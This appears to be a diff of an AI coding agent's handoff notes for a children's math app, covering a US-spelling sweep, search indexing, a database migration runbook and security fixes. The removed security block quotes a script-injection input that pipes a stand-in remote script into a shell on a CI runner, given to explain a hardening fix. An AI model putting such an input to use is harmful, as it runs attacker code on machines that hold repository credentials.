@@ -70,10 +70,26 @@
 > unverified end to end and only the founder can close it. Everything is committed; prod is on
 > **sw v120**.
 >
-> 📍 **WHERE THINGS LIVE NOW (2026-08-18/19).** Repo **`RadlorMain/learn`** (GitHub Org, **PUBLIC —
-> must stay public until Vercel is Pro**). `git remote` = `https://github.com/RadlorMain/learn.git`.
-> App is live on **`https://adaptivelearn.radlor.com`** and on `milo-story-mode.vercel.app`. Support
-> address is **support@radlor.com**; mi2utor is retired. Full story + the traps in the 🏗️ block below.
+> 📍 **WHERE THINGS LIVE NOW (2026-08-19).** **TWO repos, two Vercel projects, two hosts.**
+>
+> | | |
+> |---|---|
+> | **the product** | `RadlorMain/learn` → **`https://adaptivelearn.radlor.com`** — this repo |
+> | **the company site** | `RadlorMain/website` → **`https://radlor.com`** — at `../radlor-site` |
+>
+> ⚠️ **Both repos must stay PUBLIC until Vercel is Pro** — Hobby refuses a private *org-owned* repo
+> through the Git integration. `git remote` here is `https://github.com/RadlorMain/learn.git`.
+> Support address **support@radlor.com** (⚠️ may have no mailbox — see 🇺🇸 §⑥); mi2utor is retired.
+>
+> ⚠️ **THE TWO PROPERTIES DESCRIBE ONE ENTITY AND THAT IS LOAD-BEARING.** Both emit
+> `SoftwareApplication` with the identical `@id` `https://adaptivelearn.radlor.com/#app`, and both
+> point `publisher` at `https://radlor.com/#organization` — **declared once on radlor.com and only
+> REFERENCED here.** Retyping either string silently splits the product in half. They live in
+> `src/app/site.ts` (`APP_ID`/`COMPANY_ID`) and `../radlor-site/site.ts`, and
+> `src/__tests__/publicSeo.test.ts` asserts the exact values.
+>
+> ⚠️ **radlor.com's production domain is the APEX.** `www` 308s to it. Flipping that breaks every
+> canonical, because the `@id` above is the apex. Full story + the traps in the 🇺🇸 and 🏗️ blocks.
 >
 > ---
 >
@@ -81,6 +97,130 @@
 > Older blocks are in [docs/handoff-archive.md](docs/handoff-archive.md), which is NOT auto-loaded —
 > `grep` it. This file is inlined into every session's context, so move blocks out rather than
 > letting it grow. The craft rules live in chapter-craft.md, not here.)_
+
+> 🇺🇸 **2026-08-19 (fourth pass) — THE MVP AUDIENCE IS THE US, AND EVERY PUBLIC STRING IN BOTH REPOS WAS BRITISH. 64 "maths", ZERO "math". PLUS: radlor.com IS LIVE AND INDEXED, SEARCH CONSOLE + BING + INDEXNOW ARE WIRED, AND THE SUPABASE REGION MIGRATION HAS A RUNBOOK.** `tsc` 0 · **1135/1135** · `next build` 0 · sw **v123 → v124** · `main`@`c6d0252`.
+>
+> ## ⓪ ⚠️ "maths" IS THE WRONG KEYWORD FOR THE AUDIENCE WE ARE ACTUALLY LAUNCHING TO
+> Founder, mid-session: the MVP is entirely US. Measured before touching anything: **64 lowercase
+> `maths` and zero `math`** across both repos' copy, `locale: en_IN`, `priceCurrency: INR` in three
+> places. A US parent searches *"math app for kids"* — so every title, description and `llms.txt`
+> was optimising for a string Americans do not type, and the whole site read as non-US to an answer
+> engine.
+>
+> Swept with a case-sensitive `\bmaths\b`, which **deliberately cannot match `plotMaths`** — that is
+> a module name, not copy. Verified after: 0 remain, `plotMaths` intact in all 5 references. The 5
+> test files asserting on the string were swept with the source so the suite stays honest.
+>
+> ⚠️ **TWO THINGS DELIBERATELY NOT SWEPT, AND THE SECOND IS NOT A SPELLING QUESTION AT ALL:**
+> - **`colour`, 31 in `src/features`** — measured, **15 are code identifiers** (`COLOURS`, `colourOf`)
+>   and 16 are prose. A blind script renames identifiers, which is the fault this repo already has a
+>   rule about. Needs the halves separated by hand.
+> - **`metre`, 180** — this is **CURRICULUM**. US schools teach customary units alongside metric and
+>   the app already uses inches in 191 places (The Height Bar). Changing metres to feet changes the
+>   arithmetic in every area/perimeter chapter, its generators and its gates. **Recommended: leave
+>   it.** Metric is taught in the US; these chapters are British-leaning, not wrong.
+>
+> ## ① ⚠️⚠️ I TRIPPED VERCEL'S BOT PROTECTION WITH MY OWN POLLING LOOP — THE SAME FAULT THIS FILE ALREADY RECORDS
+> Polling both origins with `curl` every 15 s for ten minutes to watch a deploy land put my IP behind
+> **"Vercel Security Checkpoint"**, and I briefly read that as a broken deploy. It was not: the
+> deployment was `READY`, and a **real browser passed the challenge in about a second** — verified,
+> so no user was affected. The previous session's block records me doing exactly this and I did it
+> again. **Confirm a deploy through the Vercel API (`list_deployments`), not a curl loop**; if you
+> must poll, 20 s+ intervals.
+>
+> ## ② radlor.com IS LIVE, AND GOOGLE INDEXED IT WITHIN HOURS — WITH THE STALE COPY
+> Apex `216.198.79.1`, `www` → 308 → apex, cert valid, `llms.txt`/`robots.txt`/`sitemap.xml` all 200.
+> ⚠️ **Google crawled `/about` and `/data-and-safety` faster than the US-spelling fix could deploy**,
+> so the live snippet read *"adaptive maths for ages"* for a while. If a copy fix is imminent, hold
+> the indexing request — Google will not wait for you.
+>
+> ⚠️ **THE PRODUCTION DOMAIN MUST BE THE APEX, NOT `www`.** The founder had `www` set as production
+> and apex 308-ing to it. Both repos hardcode the entity `@id` `https://radlor.com/#organization`,
+> and `NEXT_PUBLIC_SITE_URL` is the apex — so `www`-as-production means every canonical points at a
+> URL that redirects away. Flipped. **Do not flip it back without changing the `@id` in both repos.**
+>
+> ## ③ 📉 THE GEO BASELINE, RECORDED — GOOGLE THINKS RADLOR IS A BEER
+> Captured hours after launch and written into `../radlor-site/docs/seo-geo-setup.md` §F0, because in
+> three months nobody remembers what the wrong answer used to be. Google's AI Overview for `radlor`:
+> *"you might mean a **radler** (a mixed beer drink) or made a typo"*, with a knowledge panel pointing
+> at **RADLOR LIMITED, Companies House — DISSOLVED 23 June 2026**.
+> ⚠️ **The competitor is not a business, it is a stale government record with better provenance than
+> a site that is hours old.** That makes `sameAs` the top code item rather than a nicety: nothing
+> currently corroborates that Radlor is a live company. One LinkedIn company page would.
+> ⚠️ I earlier reported the name as "effectively unclaimed with an Instagram handle and a Madrid hair
+> salon" — the Companies House record was there and my search missed it.
+>
+> ## ④ SEARCH CONSOLE, BING, INDEXNOW — ALL LIVE
+> - **GSC**: a **Domain property** (DNS TXT), so one property covers `radlor.com` *and*
+>   `adaptivelearn.radlor.com`. Both sitemaps submitted (10 URLs / 5 URLs).
+>   ⚠️ **Google's Domain Connect flow was CANCELLED on purpose** — it bundles *"Gmail Setup"* with
+>   domain verification and GoDaddy warned it *"will allow Google to potentially remove o365"*. One
+>   click from killing the M365 mailboxes. **Always use the manual TXT record here.**
+> - **Bing** — imported from GSC. ⚠️ Bing properties are URL-prefix, **not** domain: the subdomain
+>   needs adding as a separate site or the app never enters Bing's index, and Bing is what ChatGPT
+>   search and Copilot read.
+> - **IndexNow** — key file in `public/` of BOTH repos (verification is per host) plus
+>   `scripts/indexnow.sh`. ⚠️ **Deliberately NOT a workflow on push**: IndexNow's value is that the
+>   crawler comes immediately, which is actively harmful if it arrives before the new build is live —
+>   it re-indexes the OLD page. The script refuses any URL not already serving 200. First submissions
+>   accepted (202): 10 URLs + 5 URLs.
+>
+> ## ⑤ 🗄️ SUPABASE REGION MIGRATION — RUNBOOK WRITTEN, DEFERRED TO THE PRO UPGRADE
+> `docs/supabase-region-migration.md`. The DB is `ap-southeast-2` (Sydney), the browser talks to it
+> **directly**, and the MVP audience is US — so every auth call crosses the Pacific. Region is fixed
+> at project creation; the only route is a new project plus a migration. **15 MB, 8 auth users, 17
+> learners** — an afternoon now, a project at 800 users.
+>
+> ⚠️⚠️ **WRITING IT TURNED UP THE ASSUMPTION THAT WOULD HAVE WRECKED IT: THE REPO'S MIGRATIONS ARE
+> NOT A REPLAYABLE HISTORY OF PRODUCTION.** The repo holds **66** files; `schema_migrations` holds
+> **65** rows; **62 of the repo's versions are absent from the database and 59 of the database's are
+> absent from the repo** — only the six most recent overlap, because they were applied through the
+> MCP/dashboard, which stamps its own timestamp. **`supabase db push` against a fresh project is an
+> unverified REBUILD, not a migration.** The runbook dumps from production instead.
+> ⚠️ Also recorded, because a dump brings none of them: the **2 pg_cron retention jobs** (losing them
+> silently reopens a commitment made on `/data-and-safety`), the **default privileges** a restore
+> hands back, the auth dashboard config, and the extensions.
+> ⚠️ And the step that can lock out **5 of 8 users**: Supabase's OAuth callback contains the project
+> ref, so a new project needs its callback **ADDED** to the Google Cloud client — while
+> `admin@radlor.com` still has only **Editor** there. **Check that before starting, not halfway.**
+>
+> **Founder's call: this happens WITH the Pro upgrade, not before it.** Pro brings daily backups and
+> PITR, which solves the runbook's own §1a blocker by changing the plan rather than wiring the
+> stop-gap workflow. ⚠️ **Until then there is still no restorable copy of the children's data.**
+>
+> ## ⑥ 🔴 `support@radlor.com` MAY HAVE NO MAILBOX, AND IT IS PRINTED ON A LIVE SITE
+> Microsoft's sign-in **could not find an account for `admin@radlor.com`**. DNS proves the DOMAIN is
+> on M365 (MX, DKIM, autodiscover, tenant `NETORGFT21042623`) — it does **not** prove a mailbox
+> exists. ⚠️ I earlier asserted that address "is already a Microsoft account"; that was inferred from
+> DNS, not verified, and it was wrong. **Two-minute test: send mail to both addresses and see if it
+> bounces.** `support@radlor.com` is on `/contact`, the footer, the legal pages, `llms.txt` and the
+> schema of a live site.
+>
+> ## ⑦ 🎨 LOGO — IN PROGRESS, NOT FINISHED
+> Two supplied logos were combined by hand from their SVG paths: logo 1's wordmark + book-in-the-"o",
+> logo 2's bulb-and-pencil mark. Work in `~/Downloads/Radlor logo final/` (SVG + transparent + PNG).
+> Decisions made: tagline dropped (the site has a better line), polygons reduced from 15 web paths to
+> 8 and pulled inward, bulb recoloured into the logo's navy by **luminance** so its shading survives,
+> bulb aligned to the letters' baseline at 1.73× the "R", and background-coloured knockouts behind the
+> bulb, "R" (9), the book (9) and the final "r" (15) — **different widths on purpose: a wide knockout
+> reads as a clean bite out of a dark polygon but is invisible over thin grey lines.**
+> ⚠️ **Knockouts must be drawn BEFORE the bulb**, or the R's knockout erases the bulb's shine lines.
+>
+> **⚠️ TWO THINGS STILL OPEN, AND THE FIRST IS A REAL CONSTRAINT:**
+> - **The book IS the "o"** — welded into path `#43` with the "l". Remove the book and the word
+>   becomes "Radl_r". Any replacement mark either fills that slot or an "o" has to be drawn.
+> - **Bulb OR chest, not both.** A treasure chest was requested and drawn (front view, open lid,
+>   light rays, ~15 strokes) — but both marks emit rays and cannot share one lockup.
+> ⚠️ **The chest is my drawing and it shows** — geometric arcs against an illustrator's hand. Its
+> structure is right; the gems inside were attempted three ways and none worked at that stroke weight.
+> **Best handed to a designer as reference.**
+>
+> ## ▶ WHAT CHANGED IN THE OPEN LIST
+> ✅ radlor.com live · GSC + Bing + IndexNow wired · the GEO baseline recorded · a migration runbook.
+> 🔴 Still open and unchanged: **no backup of the children's data** · `SUPABASE_SERVICE_ROLE_KEY` ·
+> Vercel Pro (Hobby is non-commercial) · custom SMTP (Supabase's mailer 429s at launch) ·
+> `DRAFT = true` on the legal text · AR never driven with a real hand · 132 eslint errors.
+> **And two new ones:** `sameAs` is empty (§③) and `support@radlor.com` may not exist (§⑥).
 
 > ⚡ **2026-08-19 (third pass) — A DECORATIVE FONT WAS 82% OF THE APP'S FONT BYTES AND ~40% OF THE ENTIRE FIRST VISIT, PRELOADED ON EVERY PAGE, RENDERING NOTHING. ONE OPTION FIXED IT: 816 KB → 146 KB.** `tsc` 0 · **1135/1135** · `next build` 0 · sw **v122 → v123**.
 >
@@ -456,149 +596,4 @@
 >    for social-handle availability until a **control handle** showed the check could not tell taken
 >    from free. **Add a control before believing any probe.**
 
-> 🧭 **2026-08-18 — THREE ASKS (ARCHITECTURE · SECURITY · DEVOPS), AND THE SAME QUESTION BROKE ALL THREE OPEN: "so the things you flagged are fixed?" WAS ASKED THREE TIMES AND FOUND SOMETHING EVERY TIME — A GATE THAT TESTED NOTHING, A WORKFLOW THAT WOULD FAIL EVERY MONDAY, AND FLAGS I HAD CALLED VERIFIED WITHOUT RUNNING THEM.** 🧭 SHIPPED — `main`@`1e9e497`, prod serving **sw v116**. `tsc` 0 · **1122/1122 vitest** (was 1098, **+24**) · `next build` 0 · **211/211 chapters (7.7m)** · **152 passed + 48 skipped short-landscape (57.1m)** · eslint **132, unchanged**.
->
-> **The asks:** a clean-architecture refactor → *"commit it on main"* → *"yes push it"* → a senior-security audit → *"fix all Vs in one go"* → *"put the remaining ones in the md files"* → *"see the security md and what can we fix now"* → a senior-DevOps pass → *"if you want you can do this now"* (the nightly) → *"you can go with this also"* (the weekly) → *"commit and push"*.
->
-> ⚠️⚠️ **TWO COMMITS IN THIS RANGE ARE NOT MINE — ANOTHER SESSION IS COMMITTING IN THIS REPO CONCURRENTLY.** `4114e43` (AR camera door + a leads-retention migration) appeared on top of my work mid-session, and `1e9e497` committed and pushed MY working tree while I was checking `git status` between two calls. Both were verified rather than assumed: `1e9e497` contains exactly my six files with all five fixes intact. **If the tree moves under you, check `git log` before concluding anything about your own state.**
->
-> ## ⓪ ⚠️⚠️ THE METHOD LESSON, AND IT IS THE WHOLE SESSION
-> Three times the founder asked whether the flagged things were actually done. Three times the answer
-> was no, and each time the gap was **something I had reported as verified**:
-> - "are the Vs fixed?" → the React-in-`core/` item had been fixed **by someone else**, and I nearly
->   claimed it.
-> - "are the flagged things fixed?" (devops) → **`npm run dev` binds 3000 while the workflow polled
->   3017.** The weekly job would have died at the health check every Monday. It only worked locally
->   because `preview_start` reads `.claude/launch.json`, which pins 3017; CI has no launch.json.
-> - the same question again → the `supabase db dump` flags I called "verified" had **never been run**;
->   I had only tested the `openssl` half.
-> **The pattern is not carelessness, it is scope: I verified the part I built and assumed the part I
-> configured.** Ask of any "done": which half did I actually execute?
->
-> ## ① ARCHITECTURE — THE PREMISE WAS FALSE, AND THAT WAS THE DELIVERABLE
-> Asked for a clean-architecture rebuild. **Measured first: the layering is already correct** — `core`
-> imports only `core`, zero upward deps, Supabase confined to 4 files, and 14 framework-free logic
-> modules (4,697 lines) already split from 37 chapter components. A rewrite would have been pure risk
-> against 1,100 passing tests. **Refused it, and fixed the one real defect instead:** `state/store.ts`
-> re-exported `ChapterType`/`CHAPTER_*`/levelling "so existing imports keep working" — an unfinished
-> migration shim, so 11 modules pulled zustand + IndexedDB + Supabase to get a *type*, and
-> `core/adaptive.ts` imported the store (a real cycle `core → state → core`). Repointed all 11,
-> deleted the barrel. `src/__tests__/layering.test.ts` gates it; mutation-tested.
->
-> ## ② SECURITY — V13–V20, NO CRITICAL OR HIGH, AND ONE I INFLICTED MYSELF
-> Tenant isolation re-verified **live**, not read off migrations: as `anon`, `learners`/`sessions`/
-> `learner_invites` return **0 rows**; `diagnostic_leads`/`error_events` refuse `42501`.
-> - ⚠️⚠️ **V19 — I CREATED THE VULNERABILITY WHILE FIXING V16.** `prune_error_events()` was created
->   `SECURITY DEFINER`, and **Postgres gives that `PUBLIC EXECUTE` by default** while Supabase exposes
->   every public-schema function at `/rest/v1/rpc/<name>`. For a few minutes **any anonymous caller
->   could have wiped the crash log.** Caught by checking `proacl` instead of trusting `{"success":true}`.
->   **THE RULE: always pair `create function … security definer` with an explicit `REVOKE`, then read
->   `proacl` back.** Now 0 of 17 functions in `public` are anon-callable, 0 have an unpinned `search_path`.
-> - **V14** `/api/lead` did `await fetch(...)` with no `res.ok` — fetch does not throw on 4xx/5xx, so a
->   403 returned `{ok:true}` and the lead vanished **with no signal anywhere**.
-> - **V15 CSP `'unsafe-inline'` is ACCEPTED, deliberately.** Removing it needs a per-request nonce,
->   which forces every prerendered page dynamic (prod serves `x-vercel-cache: PRERENDER`); Trusted
->   Types would likely break the AR path. It is tolerable **only because the app has zero injection
->   sinks** — so the *premise* is gated (`security.test.ts` fails the build the day one appears),
->   not the header. Re-open when UGC ships.
-> - **V17** `learners.date_of_birth` — an exact birthdate on a child, written `null` by its only caller,
->   **never read**, 0 of 17 rows populated. Dropped.
-> - **V13 IS STILL OPEN** and is the one thing here the founder must unblock (see ▶1).
-> ⚠️ **The four `SECURITY DEFINER` advisor WARNs are intentional — do NOT "fix" them by revoking
-> EXECUTE; the app calls them.** All check ownership and pin `search_path`. Recorded in security.md.
->
-> ## ③ DEVOPS — THE DESIGN EXISTED; THE INFRASTRUCTURE IT DESCRIBED DID NOT
-> `ci.yml`, `deploy.yml` (staging→prod with an approval gate) and `preflight.sh` were already good.
-> **What was wrong is that `docs/devops.md` described a stack that is not real:**
-> - ⚠️⚠️ **THE ORG IS ON THE SUPABASE FREE PLAN, AND THE BIGGEST DOWNTIME RISK IS NOT TRAFFIC — IT IS
->   QUIET.** Supabase's own docs: *"We may pause applications on the Free Plan that exhibit low
->   activity in a 7-day period."* **8 children have ever played; last `chapter_open` 2026-08-15.** A
->   paused project = no auth, no sync, a login screen that never resolves. **And `/api/health` returns
->   a cheerful 200 through exactly that outage** (it is deliberately shallow, no DB call) — so an
->   uptime monitor pointed only there reports green while nobody can sign in. Point a second check at
->   something that reads the DB.
-> - **No downloadable backup exists on free.** Built `backup.yml`: `supabase db dump` → **encrypted**
->   → 30-day artifact. The encryption is load-bearing (the dump holds learner names and every session
->   played; a workflow artifact is readable by anyone with repo access).
->   ⚠️ **AND THE RESTORE HAS A TRAP:** Supabase's docs say restored tables *"inherit ALL privileges
->   from default privileges in the target database"* — **this app's security is partly GRANTS** (V12 is
->   a column-level `UPDATE(status)`; V19/`touch_grades` are EXECUTE revokes). A naive restore hands all
->   of it back while every RLS policy still looks correct. The runbook now leads with
->   `ALTER DEFAULT PRIVILEGES … REVOKE ALL`.
-> - ⚠️ **THE DATABASE IS IN THE WRONG HEMISPHERE.** Measured `x-vercel-id: bom1::iad1` — functions run
->   in **Virginia**, Supabase is **Sydney**, and the browser talks to Supabase *directly*, so every
->   auth call crosses ~250–300 ms on app-open. **Region is fixed at project creation.** At 17 learners
->   it is an afternoon; at 10,000 it is a project. **Decide before launch.**
-> - **Docker/K8s was explicitly asked for and explicitly refused:** it would trade Vercel's CDN, image
->   optimizer and preview deploys for a cluster to patch, on an app with 7 prod deps and 17 learners.
->
-> ## ④ ⚠️⚠️ BOTH NEW E2E GATES WERE VACUOUS ON FIRST WRITE — THE SAME BUG, TWO DISGUISES
-> GitHub Actions passes **`''`** for an unset `workflow_dispatch` input on a `schedule` run:
-> - `E2E_ONLY=''` → `''?.split(',')` is `['']` (optional chaining does **not** short-circuit on an
->   empty string) → filters to `[]` → **`[]` IS TRUTHY** → every chapter skipped. **211 tests → 1,
->   reporting green.** Proven by reverting the fix and re-listing.
-> - `E2E_SEED=''` → `??` does not catch `''` and **`Number('')` is 0** → the weekly would sweep seed
->   `0` while every dispatch used the pinned `20260817`, so a red run would not reproduce — defeating
->   the entire reason the suite was seeded.
-> Both fixed **in the specs** (so a shell `export E2E_ONLY=` is safe too) and guarded in the workflows.
-> **ASSUME ANY `${{ inputs.x }}` REACHING A SPEC IS `''`, NOT UNSET.**
-> ⚠️ **AND THE TWO JOBS NEED DIFFERENT SERVERS; SWAPPING THEM FAILS SILENTLY.** `nightly-e2e` uses
-> `next start` (production build — faster, truer CSP/React). `weekly-layout` **must** use `next dev`,
-> because `reachPractice` reads `[data-test-answer]`, which is dead-code-eliminated from any production
-> build. On `next start` every `reachPractice` finds no board and the suite **measures the wrong screen
-> while passing.**
-> Both suites were watched green end to end before shipping: **211/211 (7.7m)** and **152 passed +
-> 48 skipped (57.1m)**. The 48 skips are `explore:` on the 12–14 band, which has no explore sims — the
-> known dropped-EXPLORE-beats gap, reported rather than silently passed. **24% of that suite is
-> currently inert for that reason.**
->
-> ## ⑤ ⚠️ FOUR DOCUMENTS WERE ASSERTING THINGS THAT WERE NO LONGER TRUE
-> Same class as *a comment asserting a rule is followed is the most expensive kind of lie*, in the
-> files you read during an incident:
-> - `security.md` described an enforced/Report-Only CSP split with *"deliberately no `default-src`"* —
->   untrue since the CSP went enforcing on 08-16. Replaced with the measured header.
-> - `security_baseline.sql` was **6 weeks stale** (2026-07-03), predating `diagnostic_leads`,
->   `auth_events` and `error_events` — the drift check that exists to catch dashboard changes would
->   have shown a wall of legitimate diff and been ignored. **And its generator query had been lost to
->   "see git history", which is WHY it went stale.** Restored in full, now including column-level
->   grants — the blind spot that would hide V12.
-> - `devops.md` listed **PITR** in the architecture diagram and told you to enable it; not available
->   on free.
-> - `launch-plan.md` had three stale OPEN rows: analytics (*"zero deps installed"* — prod shows
->   **1,191 `session_start` / 797 `chapter_open`**), legal routes (*"none exist"* — they do; the text
->   is what is open), and monitoring.
->
-> ## ⚠️ AND THE ONE I SHIPPED THAT ANOTHER SESSION CAUGHT: SCRIPT INJECTION IN MY OWN WORKFLOWS
-> I wrote `${{ github.event.inputs.only }}` **inside the `run:` script**. Actions expands `${{ }}`
-> before bash sees the line, so a dispatch input of `"; curl evil.sh | sh; #` executes on a runner that
-> holds repo-scoped credentials. The fix (routing the value through `env:` so bash reads it as data) is
-> in the working tree **uncommitted** on both workflow files. Only a collaborator can dispatch these, so
-> it is hardening rather than an open hole — but it is the exact shape of bug I spent the session
-> hunting, in code I wrote. **Never interpolate a dispatch input into a shell script.**
->
-> ## ▶ OPEN
-> 1. ⚠️⚠️ **`SUPABASE_SERVICE_ROLE_KEY` IN VERCEL — NOW GATES THREE THINGS.** V13 (anon can still POST
->    `/rest/v1/diagnostic_leads` directly, skipping `/api/lead`'s limit — proven exploitable), durable
->    crash retention (`error_events` stays empty), and `/api/lead` falling back to the anon key.
->    ⚠️ **STRICT ORDER: set the key → apply `20260816170000_leads_server_only.sql` → submit one real
->    lead and confirm it lands.** Reversed, lead capture stops (loudly now, thanks to V14).
-> 2. ⚠️ **SUPABASE PRO (~$25/mo) IS A LAUNCH DECISION, NOT A NICE-TO-HAVE** — it buys no-pause,
->    downloadable backups and PITR. On free the app can be taken offline by its own quietness.
-> 3. ~~Commit the script-injection fix~~ ✅ **DONE 2026-08-18 (`f04dd4f`)** — and hardened properly,
->    via `env:` rather than `${{ }}` in the script. See the 🛡️ block below.
-> 4. **Dashboard-only, still open:** leaked-password protection · Auth rate limits · refresh-token
->    lifetime · `SUPABASE_DB_URL` (activates the CI RLS suite) · `MONITORING_INGEST_URL` ·
->    `BACKUP_PASSPHRASE` + `PROD_PROJECT_REF` (activates `backup.yml`) · uptime monitor (two checks,
->    one that touches the DB) · GitHub Environments with a required reviewer on `production`.
-> 5. **Rehearse one restore** into a scratch project. A backup nobody has restored is a hope, and this
->    one has the privilege trap in ③.
-> 6. **Everything from prior sessions stands:** B1 attorney (`DRAFT = true` is LIVE on prod) · **AR has
->    never been driven with a real hand** · `practice_complete` still 0 rows (nobody has played since
->    the P0 fix — "no data yet", not "still broken", but it is unproven) · 132 eslint errors, deliberately.
-> 7. Of this session's faults, **three came from the founder asking "is it done?"**, one from reading
->    Supabase's own docs, one from a lost generator query, one from `gpg` not being installed (my
->    "verification" was a missing command), one from my own grep counting `×` in `740×360` as failures
->    and reporting **590 false failures**, and **one from another session reviewing my workflow.**
->    The 1,122-test suite was green through every one of them.
-
-_Older sessions (2026-06-15 → **2026-08-15**) live in [docs/handoff-archive.md](docs/handoff-archive.md) — not loaded at session start. `grep` it for a chapter or a decision. Moved there to keep this file inside its size budget: the two 2026-08-14 blocks (🧱 all six neon chapters onto GameShell · 🎛️ the band moving onto the 12–18 engine) on 2026-08-16, 🏗️ **The Empty Plot** (the last neon chapter + the 3D deletion + the explainer-film pipeline) on 2026-08-17, 📊 **The Loading Bay** (the first storybook chapter onto GameShell, and the mastery exit finally seen to fire) and 🚀 **the first launch-hardening day** (0 security advisories, crash screens, self-hosted fonts, the enforced CSP, legal plumbing, the launch runbook) both on 2026-08-17, and 🔒 **launch hardening round two** (the walkthrough dead end, the CSP gate that had been red for a day, `media-src` silently killing the recorded voice on mobile) on 2026-08-18, and 🕳️ **the plan-pointer P0** (`ChapterPortal` dropping `onComplete`, so no child's diagnostic plan advanced for three months — plus the one-emoji-to-crawlers SEO fix and the inert short-landscape gate) on 2026-08-18, and ⚡ **the performance pass** (57 MB of art revalidated on every request, every backdrop shipped as full-size PNG, every creature journey relaying out the document — plus the /game fit controller that turned out to be dead code) on 2026-08-19._
+_Older sessions (2026-06-15 → **2026-08-15**) live in [docs/handoff-archive.md](docs/handoff-archive.md) — not loaded at session start. `grep` it for a chapter or a decision. Moved there to keep this file inside its size budget: the two 2026-08-14 blocks (🧱 all six neon chapters onto GameShell · 🎛️ the band moving onto the 12–18 engine) on 2026-08-16, 🏗️ **The Empty Plot** (the last neon chapter + the 3D deletion + the explainer-film pipeline) on 2026-08-17, 📊 **The Loading Bay** (the first storybook chapter onto GameShell, and the mastery exit finally seen to fire) and 🚀 **the first launch-hardening day** (0 security advisories, crash screens, self-hosted fonts, the enforced CSP, legal plumbing, the launch runbook) both on 2026-08-17, and 🔒 **launch hardening round two** (the walkthrough dead end, the CSP gate that had been red for a day, `media-src` silently killing the recorded voice on mobile) on 2026-08-18, and 🕳️ **the plan-pointer P0** (`ChapterPortal` dropping `onComplete`, so no child's diagnostic plan advanced for three months — plus the one-emoji-to-crawlers SEO fix and the inert short-landscape gate) on 2026-08-18, and 🧭 **the 2026-08-18 architecture/security/devops day** (the layering refactor, V13–V20, the two vacuous scheduled sweeps) on 2026-08-19, and ⚡ **the performance pass** (57 MB of art revalidated on every request, every backdrop shipped as full-size PNG, every creature journey relaying out the document — plus the /game fit controller that turned out to be dead code) on 2026-08-19._
